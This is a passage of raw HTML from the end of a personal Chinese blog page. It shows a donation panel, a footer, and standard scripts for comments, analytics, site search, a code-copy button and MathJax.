role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏他一波哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> 微信支付</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> 支付宝</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>